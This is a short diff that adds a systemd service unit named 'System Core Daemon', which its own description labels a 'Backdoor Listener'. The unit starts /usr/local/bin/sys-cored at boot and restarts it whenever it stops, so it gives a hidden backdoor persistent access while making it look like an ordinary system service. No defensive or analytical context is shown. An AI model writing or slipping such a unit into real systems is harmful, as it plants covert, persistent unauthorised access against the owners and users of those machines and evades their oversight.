@@ -1,0 +1,10 @@
+[Unit]
+Description=System Core Daemon (Backdoor Listener)
+After=network.target
+
+[Service]
+ExecStart=/usr/local/bin/sys-cored
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
